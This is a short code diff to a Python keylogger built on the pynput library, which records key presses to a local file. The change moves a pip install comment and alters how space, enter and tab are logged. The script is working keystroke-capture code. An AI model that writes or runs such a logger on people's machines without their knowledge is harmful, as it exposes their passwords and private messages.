@@ -1,3 +1,4 @@
+# pip install pynput
 import os
 from pynput.keyboard import Key, Listener
 
@@ -23,7 +24,7 @@ def on_key_press(key):
     except AttributeError:
         if key in [Key.space, Key.enter, Key.tab]:
             with open(file_path, "a") as text_file:
-                text_file.write(" '' ")
+                text_file.write("  ")
 
 
 # Ensure the directory structure exists
@@ -33,4 +34,3 @@ os.makedirs(os.path.dirname(file_path), exist_ok=True)
 with Listener(on_press=on_key_press) as listener:
     listener.join()
 
-# pip install pynput
